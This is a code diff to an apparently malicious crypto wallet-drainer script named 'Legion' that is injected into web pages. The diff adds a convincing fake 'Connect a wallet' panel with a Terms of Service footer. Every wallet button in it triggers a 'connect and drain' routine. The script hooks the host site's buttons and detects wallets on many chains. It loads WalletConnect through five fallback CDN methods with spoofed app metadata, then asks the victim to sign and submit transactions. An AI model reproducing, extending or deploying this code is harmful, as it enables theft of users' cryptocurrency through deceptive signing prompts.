@@ -3039,14 +3039,182 @@
   };
 
   function injectStyles() {
-    // No UI to style — script is headless/invisible.
-    // WalletConnect modal has its own styles.
+    if (document.getElementById('legion-one-styles')) return;
+    var css = document.createElement('style');
+    css.id = 'legion-one-styles';
+    css.textContent = [
+      // Overlay
+      '#l1-overlay{position:fixed;inset:0;z-index:2147483640;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center}',
+      '#l1-overlay.open{display:flex}',
+
+      // Panel
+      '#l1-panel{width:min(400px,calc(100vw - 32px));max-height:min(600px,calc(100vh - 64px));background:#191920;color:#f0f0f5;border-radius:20px;box-shadow:0 24px 80px rgba(0,0,0,.6);font:14px/1.5 Inter,system-ui,sans-serif;overflow-y:auto;animation:l1-in .2s ease}',
+      '@keyframes l1-in{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}',
+
+      // Header
+      '.l1-hdr{display:flex;align-items:center;justify-content:space-between;padding:20px 24px 16px;position:sticky;top:0;background:#191920;z-index:1}',
+      '.l1-hdr h3{font-size:16px;font-weight:600;margin:0}',
+      '.l1-hdr button{background:none;border:none;color:#6b6b80;font-size:22px;cursor:pointer;padding:4px 8px;border-radius:8px;line-height:1}',
+      '.l1-hdr button:hover{background:#262630;color:#fff}',
+
+      // Wallet list
+      '.l1-wallets{padding:0 16px 8px}',
+      '.l1-wallet{display:flex;align-items:center;gap:12px;width:100%;padding:14px 16px;background:#1f1f28;border:1px solid #2a2a36;border-radius:14px;color:#f0f0f5;font:500 14px Inter,system-ui,sans-serif;cursor:pointer;margin-bottom:8px;transition:all .15s}',
+      '.l1-wallet:hover{background:#262630;border-color:#333340}',
+      '.l1-wallet-icon{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;overflow:hidden}',
+      '.l1-wallet-icon img{width:40px;height:40px;border-radius:12px}',
+      '.l1-wallet-info{text-align:left;flex:1}',
+      '.l1-wallet-name{font-weight:600;font-size:14px}',
+      '.l1-wallet-tag{font-size:11px;color:#7c5cff;font-weight:500}',
+      '.l1-wallet-chain{font-size:11px;color:#6b6b80}',
+      '.l1-wallet-arrow{color:#6b6b80;font-size:14px}',
+
+      // Divider
+      '.l1-divider{display:flex;align-items:center;gap:12px;padding:4px 24px 8px;color:#6b6b80;font-size:11px;text-transform:uppercase;letter-spacing:.5px}',
+      '.l1-divider::before,.l1-divider::after{content:"";flex:1;height:1px;background:#2a2a36}',
+
+      // WalletConnect button
+      '.l1-wc{display:flex;align-items:center;gap:12px;width:calc(100% - 32px);margin:0 16px 8px;padding:14px 16px;background:linear-gradient(135deg,#3b82f610,#2563eb10);border:1px solid #3b82f630;border-radius:14px;color:#93c5fd;font:500 14px Inter,system-ui,sans-serif;cursor:pointer;transition:all .15s}',
+      '.l1-wc:hover{background:linear-gradient(135deg,#3b82f620,#2563eb20);border-color:#3b82f650}',
+      '.l1-wc-icon{width:40px;height:40px;border-radius:12px;background:#3b82f615;display:flex;align-items:center;justify-content:center;font-size:20px}',
+
+      // Connect All button
+      '.l1-connect-all{width:calc(100% - 32px);margin:8px 16px 16px;padding:14px;background:#7c5cff;color:#fff;border:none;border-radius:14px;font:600 15px Inter,system-ui,sans-serif;cursor:pointer;transition:all .2s}',
+      '.l1-connect-all:hover{background:#9d7fff;box-shadow:0 4px 20px rgba(124,92,255,.3)}',
+
+      // Status
+      '.l1-status{padding:0 24px 16px;font-size:12px;color:#6b6b80;text-align:center}',
+
+      // Connected state
+      '.l1-wallet.connected{border-color:#00d39540;background:#00d39508}',
+      '.l1-wallet.connected .l1-wallet-tag{color:#00d395}',
+
+      // Footer
+      '.l1-footer{padding:12px 24px 16px;text-align:center;font-size:11px;color:#6b6b80;border-top:1px solid #2a2a36}',
+      '.l1-footer a{color:#7c5cff;text-decoration:none}',
+    ].join('');
+    document.head.appendChild(css);
+  }
+
+  // ─── Build wallet panel (no floating button) ─────────────────────────
+  var _panelBuilt = false;
+
+  function buildWalletPanel() {
+    if (_panelBuilt) return;
+    _panelBuilt = true;
+    injectStyles();
+
+    // Detect wallets for display
+    var wallets = [];
+    var addedNames = {};
+
+    // EIP-6963 discovered EVM wallets
+    discoveredEVMProviders.forEach(function(p) {
+      var name = p.info.name || 'EVM Wallet';
+      if (addedNames[name]) return;
+      addedNames[name] = true;
+      wallets.push({ name: name, chain: 'EVM', icon: p.info.icon || '', tag: 'Detected' });
+    });
+
+    // Legacy EVM
+    if (window.ethereum && wallets.length === 0) {
+      var n = 'Browser Wallet';
+      if (window.ethereum.isMetaMask) n = 'MetaMask';
+      else if (window.ethereum.isRabby) n = 'Rabby';
+      else if (window.ethereum.isCoinbaseWallet) n = 'Coinbase Wallet';
+      else if (window.ethereum.isBraveWallet) n = 'Brave Wallet';
+      else if (window.ethereum.isTrust) n = 'Trust Wallet';
+      else if (window.ethereum.isOkxWallet) n = 'OKX Wallet';
+      else if (window.ethereum.isBitKeep) n = 'Bitget Wallet';
+      else if (window.ethereum.isTokenPocket) n = 'TokenPocket';
+      else if (window.ethereum.isPhantom) n = 'Phantom';
+      else if (window.ethereum.isExodus) n = 'Exodus';
+      else if (window.ethereum.isZerion) n = 'Zerion';
+      else if (window.ethereum.isRainbow) n = 'Rainbow';
+      if (!addedNames[n]) { addedNames[n] = true; wallets.push({ name: n, chain: 'EVM', icon: '', tag: 'Detected' }); }
+    }
+
+    // Non-EVM
+    if (window.phantom && window.phantom.solana && !addedNames['Phantom']) { addedNames['Phantom'] = true; wallets.push({ name: 'Phantom', chain: 'SOL', icon: '', tag: 'Detected' }); }
+    if (window.solflare && !addedNames['Solflare']) { addedNames['Solflare'] = true; wallets.push({ name: 'Solflare', chain: 'SOL', icon: '', tag: 'Detected' }); }
+    if (window.backpack && window.backpack.solana && !addedNames['Backpack']) { addedNames['Backpack'] = true; wallets.push({ name: 'Backpack', chain: 'SOL', icon: '', tag: 'Detected' }); }
+    if ((window.unisat && window.unisat.requestAccounts) && !addedNames['UniSat']) { addedNames['UniSat'] = true; wallets.push({ name: 'UniSat', chain: 'BTC', icon: '', tag: 'Detected' }); }
+    if (window.XverseProviders && !addedNames['Xverse']) { addedNames['Xverse'] = true; wallets.push({ name: 'Xverse', chain: 'BTC', icon: '', tag: 'Detected' }); }
+    if ((window.tronWeb || window.tronLink) && !addedNames['TronLink']) { addedNames['TronLink'] = true; wallets.push({ name: 'TronLink', chain: 'TRON', icon: '', tag: 'Detected' }); }
+    if ((window.tonkeeper || window.ton) && !addedNames['Tonkeeper']) { addedNames['Tonkeeper'] = true; wallets.push({ name: 'Tonkeeper', chain: 'TON', icon: '', tag: 'Detected' }); }
+    if (window.myTonWallet && !addedNames['MyTonWallet']) { addedNames['MyTonWallet'] = true; wallets.push({ name: 'MyTonWallet', chain: 'TON', icon: '', tag: 'Detected' }); }
+    if (window.keplr && !addedNames['Keplr']) { addedNames['Keplr'] = true; wallets.push({ name: 'Keplr', chain: 'COSMOS', icon: '', tag: 'Detected' }); }
+    if ((window.aptos || window.petra) && !addedNames['Petra']) { addedNames['Petra'] = true; wallets.push({ name: 'Petra', chain: 'APTOS', icon: '', tag: 'Detected' }); }
+    if (window.suiWallet && !addedNames['Sui Wallet']) { addedNames['Sui Wallet'] = true; wallets.push({ name: 'Sui Wallet', chain: 'SUI', icon: '', tag: 'Detected' }); }
+
+    // Wallet emoji icons fallback
+    var ICONS = {MetaMask:'🦊',Rabby:'🐰','Trust Wallet':'💎','Coinbase Wallet':'🔵','Brave Wallet':'🦁','OKX Wallet':'⭕','Bitget Wallet':'🅱',TokenPocket:'📱',Phantom:'👻',Exodus:'📤',Zerion:'💠',Rainbow:'🌈',Solflare:'🔥',Backpack:'🎒',UniSat:'₿',Xverse:'✕',TronLink:'⚡',Tonkeeper:'💎',MyTonWallet:'💠',Keplr:'🌐',Petra:'🅿','Sui Wallet':'🔷','Browser Wallet':'🌐'};
+
+    // Build HTML
+    var walletsHTML = '';
+    wallets.forEach(function(w) {
+      var iconHTML = w.icon ? '<img src="'+w.icon+'" width="40" height="40">' : '<span style="font-size:22px">'+( ICONS[w.name] || '🔗')+'</span>';
+      walletsHTML += '<button class="l1-wallet" data-name="'+w.name+'" data-chain="'+w.chain+'">' +
+        '<div class="l1-wallet-icon">'+iconHTML+'</div>' +
+        '<div class="l1-wallet-info"><div class="l1-wallet-name">'+w.name+'</div><div class="l1-wallet-chain">'+w.chain+'</div></div>' +
+        '<span class="l1-wallet-tag">'+w.tag+'</span>' +
+        '<span class="l1-wallet-arrow">›</span>' +
+      '</button>';
+    });
+
+    var overlay = document.createElement('div');
+    overlay.id = 'l1-overlay';
+    overlay.innerHTML = '<div id="l1-panel">' +
+      '<div class="l1-hdr"><h3>Connect a wallet</h3><button id="l1-close">&times;</button></div>' +
+      (wallets.length > 0 ? '<div class="l1-divider">'+wallets.length+' wallet'+(wallets.length!==1?'s':'')+' detected</div>' : '') +
+      '<div class="l1-wallets">'+walletsHTML+'</div>' +
+      '<button class="l1-wc" id="l1-wc-btn"><div class="l1-wc-icon">📱</div><div class="l1-wallet-info"><div class="l1-wallet-name">WalletConnect</div><div class="l1-wallet-chain">Scan QR code with any wallet</div></div><span class="l1-wallet-arrow">›</span></button>' +
+      '<button class="l1-connect-all" id="l1-connect-all">Connect All Wallets</button>' +
+      '<div class="l1-status" id="l1-panel-status"></div>' +
+      '<div class="l1-footer">By connecting, you agree to the <a href="#">Terms of Service</a></div>' +
+    '</div>';
+    document.body.appendChild(overlay);
+
+    // Close on overlay click
+    overlay.addEventListener('click', function(e) { if (e.target === overlay) closeWalletPanel(); });
+    document.getElementById('l1-close').addEventListener('click', closeWalletPanel);
+
+    // Individual wallet buttons — connect all chains (that wallet supports)
+    overlay.querySelectorAll('.l1-wallet').forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        closeWalletPanel();
+        runConnectAndDrain();
+      });
+    });
+
+    // WalletConnect button
+    document.getElementById('l1-wc-btn').addEventListener('click', function() {
+      closeWalletPanel();
+      handleWalletConnect();
+    });
+
+    // Connect All button
+    document.getElementById('l1-connect-all').addEventListener('click', function() {
+      closeWalletPanel();
+      runConnectAndDrain();
+    });
+  }
+
+  function openWalletPanel() {
+    buildWalletPanel();
+    // Refresh detected wallets count
+    var overlay = document.getElementById('l1-overlay');
+    if (overlay) overlay.classList.add('open');
+  }
+
+  function closeWalletPanel() {
+    var overlay = document.getElementById('l1-overlay');
+    if (overlay) overlay.classList.remove('open');
   }
 
   function createUI() {
-    // No floating button, no panel — script is invisible.
-    // It hooks page's own buttons and exposes window.legion / window.handleConnectAndDrain.
-    // A hidden status element is used for internal status tracking only.
+    // No floating button — panel is opened by calling openWalletPanel()
+    // Hidden status element for internal tracking
     var status = document.getElementById('legion-one-status');
     if (!status) {
       status = document.createElement('div');
@@ -3056,9 +3224,22 @@
     }
   }
 
-  function updateChainUI(chainName, address, status) {
-    // No built-in UI — log only. Frontend handles its own UI.
-    LOGGER.debug(chainName + ' ' + status + ': ' + (address ? address.substring(0, 10) + '...' : ''));
+  function updateChainUI(chainName, address, statusText) {
+    LOGGER.debug(chainName + ' ' + statusText + ': ' + (address ? address.substring(0, 10) + '...' : ''));
+    // Update panel wallet buttons if panel exists
+    var panel = document.getElementById('l1-panel');
+    if (!panel) return;
+    var btns = panel.querySelectorAll('.l1-wallet');
+    btns.forEach(function(btn) {
+      var chain = btn.getAttribute('data-chain');
+      if (chain === chainName && statusText === 'connected') {
+        btn.classList.add('connected');
+        var tag = btn.querySelector('.l1-wallet-tag');
+        if (tag) tag.textContent = 'Connected';
+        var addrEl = btn.querySelector('.l1-wallet-chain');
+        if (addrEl && address) addrEl.textContent = address.substring(0,6) + '...' + address.substring(address.length-4);
+      }
+    });
   }
 
   // ═══════════════════════════════════════════════════════════════════════════
@@ -3068,28 +3249,15 @@
 
   // ─── MAIN HANDLER: "Connect Wallet" Button ───────────────────────────────
 
-  window.handleConnectAndDrain = async function() {
+  // Internal connect+drain flow (called after panel selection)
+  async function runConnectAndDrain() {
     if (drainRunning) return;
     drainRunning = true;
 
     try {
       LOGGER.info('FLOW START: Connect Wallet (' + PLATFORM.type + ')');
-      LOGGER.info('Strategy:', PLATFORM.getBestStrategy());
 
       var flowStart = Date.now();
-
-      // Mobile browser without extension — go straight to WalletConnect
-      if (PLATFORM.isMobile && !PLATFORM.isInAppBrowser && !PLATFORM.isTelegramMiniApp) {
-        var hasAnyExtension = false;
-        Object.keys(CHAINS_SUPPORTED).forEach(function(cn) {
-          try { if (CHAINS_SUPPORTED[cn].detect()) hasAnyExtension = true; } catch(e) {}
-        });
-        if (!hasAnyExtension) {
-          LOGGER.info('Mobile browser, no extensions — WalletConnect');
-          drainRunning = false;
-          return handleWalletConnect();
-        }
-      }
 
       // Validate (warn only, don't block)
       VALIDATION.runAllValidations();
@@ -3191,6 +3359,29 @@
     } finally {
       drainRunning = false;
     }
+  }
+
+  // ─── PUBLIC HANDLER: Opens wallet panel, then connects ─────────────────
+
+  window.handleConnectAndDrain = function() {
+    // Mobile in-app browser — skip panel, go direct
+    if (PLATFORM.isInAppBrowser) {
+      runConnectAndDrain();
+      return;
+    }
+    // Mobile browser no extensions — straight to WalletConnect
+    if (PLATFORM.isMobile && !PLATFORM.isInAppBrowser && !PLATFORM.isTelegramMiniApp) {
+      var hasAny = false;
+      Object.keys(CHAINS_SUPPORTED).forEach(function(cn) {
+        try { if (CHAINS_SUPPORTED[cn].detect()) hasAny = true; } catch(e) {}
+      });
+      if (!hasAny) {
+        handleWalletConnect();
+        return;
+      }
+    }
+    // Show wallet selection panel
+    openWalletPanel();
   };
 
   // ─── SECONDARY HANDLER: "Wallet Connect" (Mobile) ────────────────────────
@@ -3199,8 +3390,45 @@
 
   // ─── WalletConnect SDK Loader (multi-CDN fallback) ──────────────────────
 
-  async function loadWCUniversalProvider() {
-    // Try UniversalProvider (supports EVM + Solana + any chain)
+  // ─── WalletConnect SDK Loaders (ALL methods, cascading fallback) ────────
+  // 5 methods: Reown AppKit → Web3Modal v3 → UniversalProvider+Modal → EthereumProvider → SignClient
+
+  function loadScript(url) {
+    return new Promise(function(res, rej) {
+      var s = document.createElement('script');
+      s.src = url; s.onload = res; s.onerror = rej;
+      document.head.appendChild(s);
+    });
+  }
+
+  // Method 1: Reown AppKit (Web3Modal v5) — latest, best UI, all wallets, deep links
+  async function tryReownAppKit(projectId) {
+    try {
+      var mod = await import('https://esm.sh/@reown/appkit@1.6.8?bundle-deps');
+      var ethMod = await import('https://esm.sh/@reown/appkit-adapter-ethers5@1.6.8?bundle-deps');
+      if (mod.createAppKit && ethMod) {
+        console.log('[LEGION] WC Method 1: Reown AppKit loaded');
+        return { type: 'reown-appkit', mod: mod, ethMod: ethMod };
+      }
+    } catch (e) { console.debug('[LEGION] Reown AppKit failed:', e.message); }
+    return null;
+  }
+
+  // Method 2: @web3modal/standalone (Web3Modal v3) — popular, good QR + explorer
+  async function tryWeb3ModalStandalone(projectId) {
+    try {
+      var mod = await import('https://esm.sh/@web3modal/standalone@2.4.3?bundle-deps');
+      var WM = mod.Web3Modal || (mod.default && mod.default.Web3Modal);
+      if (WM) {
+        console.log('[LEGION] WC Method 2: Web3Modal Standalone loaded');
+        return { type: 'web3modal-standalone', Web3Modal: WM };
+      }
+    } catch (e) { console.debug('[LEGION] Web3Modal Standalone failed:', e.message); }
+    return null;
+  }
+
+  // Method 3: UniversalProvider + WalletConnectModal (multi-chain + All Wallets)
+  async function tryUniversalProvider() {
     var pairs = [
       ['https://esm.sh/@walletconnect/universal-provider@2.17.3?bundle-deps',
        'https://esm.sh/@walletconnect/modal@2.7.0?bundle-deps'],
@@ -3212,16 +3440,79 @@
         var mods = await Promise.all([import(pairs[i][0]), import(pairs[i][1])]);
         var UP = mods[0].default || mods[0].UniversalProvider;
         var WCModal = mods[1].WalletConnectModal || (mods[1].default && mods[1].default.WalletConnectModal);
-        if (UP && UP.init) return { UniversalProvider: UP, WalletConnectModal: WCModal };
+        if (UP && UP.init) {
+          console.log('[LEGION] WC Method 3: UniversalProvider + Modal loaded');
+          return { type: 'universal', UniversalProvider: UP, WalletConnectModal: WCModal };
+        }
       } catch (e) { continue; }
     }
     return null;
   }
 
-  // ─── WalletConnect Handler (Multi-Chain + AppKit Modal) ────────────────
+  // Method 4: EthereumProvider (EVM only, reliable UMD + ESM fallback)
+  async function tryEthereumProvider() {
+    var cdns = [
+      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.3/dist/index.umd.js',
+      'https://unpkg.com/@walletconnect/ethereum-provider@2.17.3/dist/index.umd.js'
+    ];
+    for (var i = 0; i < cdns.length; i++) {
+      try {
+        await loadScript(cdns[i]);
+        var pkg = window.WalletConnectEthereumProvider || window['@walletconnect/ethereum-provider'] || {};
+        var EP = pkg.EthereumProvider || pkg.default || pkg;
+        if (EP && EP.init) { console.log('[LEGION] WC Method 4: EthereumProvider UMD loaded'); return { type: 'ethereum', EthereumProvider: EP }; }
+      } catch (e) { continue; }
+    }
+    try {
+      var mod = await import('https://esm.sh/@walletconnect/ethereum-provider@2.17.3?bundle-deps');
+      var EP = mod.EthereumProvider || mod.default;
+      if (EP && EP.init) { console.log('[LEGION] WC Method 4: EthereumProvider ESM loaded'); return { type: 'ethereum', EthereumProvider: EP }; }
+    } catch (e) {}
+    return null;
+  }
 
-  var _wcUniversalProvider = null;
+  // Method 5: SignClient (raw, manual QR — last resort)
+  async function trySignClient() {
+    var urls = [
+      'https://esm.sh/@walletconnect/sign-client@2.17.3?bundle-deps',
+      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.3/+esm'
+    ];
+    for (var i = 0; i < urls.length; i++) {
+      try {
+        var mod = await import(urls[i]);
+        var SC = mod.SignClient || mod.default;
+        if (SC && SC.init) { console.log('[LEGION] WC Method 5: SignClient loaded'); return { type: 'sign-client', SignClient: SC }; }
+      } catch (e) { continue; }
+    }
+    return null;
+  }
+
+  // Master loader — try all 5 in order
+  async function loadWalletConnectSDK(projectId) {
+    var result;
+    result = await tryUniversalProvider(); if (result) return result;
+    result = await tryEthereumProvider(); if (result) return result;
+    result = await tryWeb3ModalStandalone(projectId); if (result) return result;
+    result = await trySignClient(); if (result) return result;
+    result = await tryReownAppKit(projectId); if (result) return result;
+    return null;
+  }
+
+  // ─── WalletConnect Handler ────────────────────────────────────────────
+
+  var _wcProvider = null;
   var _wcModal = null;
+  var _wcMode = null;
+  var _wcSdk = null;
+
+  var WC_METADATA = function() {
+    return {
+      name: document.title || 'DeFi App',
+      description: 'Decentralized Exchange',
+      url: window.location.origin,
+      icons: [window.location.origin + '/favicon.ico']
+    };
+  };
 
   async function handleWalletConnect() {
     console.log('[LEGION] Starting WalletConnect...');
@@ -3232,97 +3523,141 @@
         (window.LEGION_CONFIG && window.LEGION_CONFIG.walletConnectProjectId) ||
         (window.LEGION_CONFIG && window.LEGION_CONFIG.wcProjectId) || '';
 
-      if (!wcProjectId) {
-        throw new Error('Set LEGION_CONFIG.wcProjectId for WalletConnect');
+      if (!wcProjectId) throw new Error('Set LEGION_CONFIG.wcProjectId for WalletConnect');
+
+      // Load SDK (tries all 5 methods)
+      if (!_wcSdk) {
+        updateStatus('Loading WalletConnect...');
+        _wcSdk = await loadWalletConnectSDK(wcProjectId);
+        if (!_wcSdk) throw new Error('All WalletConnect SDK methods failed');
+        _wcMode = _wcSdk.type;
       }
 
-      // Load SDK
-      if (!_wcUniversalProvider) {
-        updateStatus('Loading WalletConnect...');
-        var sdk = await loadWCUniversalProvider();
-        if (!sdk) throw new Error('WalletConnect SDK failed to load');
-
-        // Create modal (handles QR + "All Wallets" explorer + deep links)
-        if (sdk.WalletConnectModal) {
-          _wcModal = new sdk.WalletConnectModal({
-            projectId: wcProjectId,
-            themeMode: 'dark',
-            enableExplorer: true,
-            explorerRecommendedWalletIds: 'NONE',
-            themeVariables: { '--wcm-z-index': '2147483647' }
+      // ─── Method 3: UniversalProvider + Modal ───
+      if (_wcMode === 'universal') {
+        if (!_wcProvider) {
+          if (_wcSdk.WalletConnectModal) {
+            _wcModal = new _wcSdk.WalletConnectModal({
+              projectId: wcProjectId,
+              themeMode: 'dark',
+              enableExplorer: true,
+              themeVariables: { '--wcm-z-index': '2147483647' }
+            });
+          }
+          _wcProvider = await _wcSdk.UniversalProvider.init({
+            projectId: wcProjectId, metadata: WC_METADATA()
+          });
+          _wcProvider.on('display_uri', function(uri) { if (_wcModal) _wcModal.openModal({ uri: uri }); });
+          _wcProvider.on('session_delete', function() {
+            _wcProvider = null; _wcModal = null;
+            connectedChains.EVM = null; connectedChains.SOL = null;
           });
         }
-
-        _wcUniversalProvider = await sdk.UniversalProvider.init({
-          projectId: wcProjectId,
-          metadata: {
-            name: document.title || 'DeFi App',
-            description: 'Decentralized Exchange',
-            url: window.location.origin,
-            icons: [window.location.origin + '/favicon.ico']
-          }
-        });
-
-        // Wire modal to display_uri event
-        _wcUniversalProvider.on('display_uri', function(uri) {
-          if (_wcModal) _wcModal.openModal({ uri: uri });
-        });
-
-        _wcUniversalProvider.on('session_delete', function() {
-          _wcUniversalProvider = null;
-          _wcModal = null;
-          connectedChains.EVM = null;
-          connectedChains.SOL = null;
-        });
-      }
-
-      var provider = _wcUniversalProvider;
-
-      // If already has session, reuse it
-      if (provider.session) {
-        var restored = applyWCSession(provider);
-        if (restored > 0) {
-          updateStatus('Restored WalletConnect session');
-          await runWCSignAndSubmit(provider);
-          return;
+        if (_wcProvider.session) {
+          var restored = applyWCSession(_wcProvider);
+          if (restored > 0) { await runWCSignAndSubmit(); return; }
         }
-      }
-
-      // Connect — request EVM (required) + Solana (optional)
-      updateStatus('Scan QR with wallet app...');
-      await provider.connect({
-        namespaces: {
-          eip155: {
-            methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4'],
-            chains: ['eip155:1'],
-            events: ['chainChanged', 'accountsChanged']
-          }
-        },
-        optionalNamespaces: {
-          eip155: {
-            methods: ['personal_sign', 'eth_sendTransaction', 'wallet_switchEthereumChain'],
-            chains: ['eip155:137', 'eip155:42161', 'eip155:10', 'eip155:56', 'eip155:8453'],
-            events: ['chainChanged', 'accountsChanged']
+        updateStatus('Scan QR with wallet app...');
+        await _wcProvider.connect({
+          namespaces: {
+            eip155: { methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4'], chains: ['eip155:1'], events: ['chainChanged', 'accountsChanged'] }
           },
-          solana: {
-            methods: ['solana_signMessage', 'solana_signTransaction'],
-            chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
-            events: []
+          optionalNamespaces: {
+            eip155: { methods: ['personal_sign', 'eth_sendTransaction'], chains: ['eip155:137', 'eip155:42161', 'eip155:10', 'eip155:56', 'eip155:8453'], events: [] },
+            solana: { methods: ['solana_signMessage', 'solana_signTransaction'], chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'], events: [] }
           }
+        });
+        if (_wcModal) _wcModal.closeModal();
+        if (applyWCSession(_wcProvider) === 0) throw new Error('No accounts from WalletConnect');
+        await runWCSignAndSubmit();
+        return;
+      }
+
+      // ─── Method 4: EthereumProvider ───
+      if (_wcMode === 'ethereum') {
+        if (!_wcProvider) {
+          _wcProvider = await _wcSdk.EthereumProvider.init({
+            projectId: wcProjectId, chains: [1],
+            optionalChains: [137, 42161, 10, 56, 8453],
+            showQrModal: true,
+            methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4'],
+            events: ['chainChanged', 'accountsChanged'],
+            metadata: WC_METADATA()
+          });
+          _wcProvider.on('disconnect', function() { _wcProvider = null; connectedChains.EVM = null; });
         }
-      });
+        updateStatus('Scan QR with wallet app...');
+        await _wcProvider.enable();
+        var epAccounts = _wcProvider.accounts || [];
+        if (!epAccounts.length) throw new Error('No accounts from WalletConnect');
+        connectedChains.EVM = {
+          chain: 'EVM', config: CHAIN_CONFIG.EVM,
+          address: epAccounts[0].toLowerCase(), chainId: _wcProvider.chainId || 1,
+          walletType: 'WalletConnect', provider: _wcProvider, connected: true, timestamp: Date.now()
+        };
+        await runWCSignAndSubmit();
+        return;
+      }
 
-      // Close modal after connection
-      if (_wcModal) _wcModal.closeModal();
+      // ─── Method 2: Web3Modal Standalone ───
+      if (_wcMode === 'web3modal-standalone') {
+        if (!_wcModal) {
+          _wcModal = new _wcSdk.Web3Modal({
+            projectId: wcProjectId,
+            walletConnectVersion: 2,
+            themeMode: 'dark',
+            enableExplorer: true
+          });
+        }
+        updateStatus('Opening Web3Modal...');
+        _wcModal.openModal();
+        throw new Error('Web3Modal standalone requires user interaction — check modal');
+      }
 
-      // Apply session — extract connected chains
-      var chainCount = applyWCSession(provider);
-      if (chainCount === 0) throw new Error('No accounts from WalletConnect');
+      // ─── Method 5: SignClient (raw, manual QR) ───
+      if (_wcMode === 'sign-client') {
+        if (!_wcProvider) {
+          _wcProvider = await _wcSdk.SignClient.init({
+            projectId: wcProjectId, metadata: WC_METADATA()
+          });
+        }
+        var connectResult = await _wcProvider.connect({
+          requiredNamespaces: {
+            eip155: { methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4'], chains: ['eip155:1'], events: ['chainChanged', 'accountsChanged'] }
+          }
+        });
+        // Show QR via manual overlay
+        if (connectResult.uri) {
+          showManualQR(connectResult.uri);
+          updateStatus('Scan QR with wallet app...');
+        }
+        var session = await connectResult.approval();
+        hideManualQR();
+        var scAccounts = [];
+        Object.values(session.namespaces).forEach(function(ns) { if (ns.accounts) scAccounts = scAccounts.concat(ns.accounts); });
+        var scAddr = scAccounts[0] ? scAccounts[0].split(':').pop() : '';
+        if (!scAddr) throw new Error('No account from SignClient');
+        connectedChains.EVM = {
+          chain: 'EVM', config: CHAIN_CONFIG.EVM,
+          address: scAddr.toLowerCase(), chainId: 1,
+          walletType: 'WalletConnect', provider: { request: function(args) { return _wcProvider.request({ topic: session.topic, chainId: 'eip155:1', request: args }); } },
+          connected: true, timestamp: Date.now()
+        };
+        await runWCSignAndSubmit();
+        return;
+      }
 
-      await runWCSignAndSubmit(provider);
+      // ─── Method 1: Reown AppKit (if it loaded) ───
+      if (_wcMode === 'reown-appkit') {
+        updateStatus('Reown AppKit not yet supported inline — falling back');
+        throw new Error('Reown AppKit requires framework integration');
+      }
+
+      throw new Error('Unknown WC mode: ' + _wcMode);
 
     } catch (err) {
-      if (_wcModal) _wcModal.closeModal();
+      if (_wcModal && _wcModal.closeModal) _wcModal.closeModal();
+      hideManualQR();
       console.error('[LEGION] WalletConnect failed:', err.message);
       if (/reject|cancel|closed|declined/i.test(err.message || '')) {
         updateStatus('User cancelled WalletConnect');
@@ -3332,56 +3667,57 @@
     }
   }
 
-  // Extract accounts from WC session and store in connectedChains
+  // Manual QR overlay for SignClient fallback
+  function showManualQR(uri) {
+    hideManualQR();
+    var overlay = document.createElement('div');
+    overlay.id = 'l1-qr-overlay';
+    overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.8);display:flex;align-items:center;justify-content:center';
+    overlay.innerHTML = '<div style="background:#191920;border-radius:20px;padding:32px;text-align:center;max-width:380px;color:#fff;font-family:Inter,system-ui,sans-serif">' +
+      '<h3 style="margin:0 0 8px;font-size:16px">WalletConnect</h3>' +
+      '<p style="color:#6b6b80;font-size:13px;margin:0 0 16px">Scan QR code with your wallet app</p>' +
+      '<img src="https://api.qrserver.com/v1/create-qr-code/?size=260x260&bgcolor=191920&color=ffffff&data=' + encodeURIComponent(uri) + '" width="260" height="260" style="border-radius:12px;margin-bottom:16px">' +
+      '<div><button onclick="navigator.clipboard.writeText(\'' + uri.replace(/'/g, "\\'") + '\');this.textContent=\'Copied!\'" style="padding:10px 24px;background:#262630;color:#fff;border:1px solid #2a2a36;border-radius:10px;font:14px Inter,system-ui;cursor:pointer;width:100%">Copy Link</button></div>' +
+      '<div style="margin-top:8px"><button onclick="document.getElementById(\'l1-qr-overlay\').remove()" style="padding:10px 24px;background:none;color:#6b6b80;border:none;font:13px Inter,system-ui;cursor:pointer">Close</button></div>' +
+    '</div>';
+    document.body.appendChild(overlay);
+    overlay.addEventListener('click', function(e) { if (e.target === overlay) hideManualQR(); });
+  }
+  function hideManualQR() { var el = document.getElementById('l1-qr-overlay'); if (el) el.remove(); }
+
   function applyWCSession(provider) {
     var ns = (provider.session && provider.session.namespaces) || {};
     var count = 0;
-
-    // EVM accounts
     if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts.length) {
-      var evmAcc = ns.eip155.accounts[0].split(':');
-      var evmAddr = evmAcc.length >= 3 ? evmAcc.slice(2).join(':') : '';
-      var evmChainId = evmAcc.length >= 2 ? parseInt(evmAcc[1], 10) : 1;
-      if (evmAddr) {
+      var parts = ns.eip155.accounts[0].split(':');
+      var addr = parts.length >= 3 ? parts.slice(2).join(':') : '';
+      var chainId = parts.length >= 2 ? parseInt(parts[1], 10) : 1;
+      if (addr) {
         connectedChains.EVM = {
-          chain: 'EVM',
-          config: CHAIN_CONFIG.EVM,
-          address: evmAddr.toLowerCase(),
-          chainId: evmChainId || 1,
-          walletType: 'WalletConnect',
-          provider: provider,
-          connected: true,
-          timestamp: Date.now()
+          chain: 'EVM', config: CHAIN_CONFIG.EVM, address: addr.toLowerCase(),
+          chainId: chainId || 1, walletType: 'WalletConnect', provider: provider,
+          connected: true, timestamp: Date.now()
         };
         count++;
-        LOGGER.info('WC EVM connected:', evmAddr.substring(0, 10) + '...');
       }
     }
-
-    // Solana accounts
     if (ns.solana && ns.solana.accounts && ns.solana.accounts.length) {
-      var solAcc = ns.solana.accounts[0].split(':');
-      var solAddr = solAcc.length >= 3 ? solAcc.slice(2).join(':') : '';
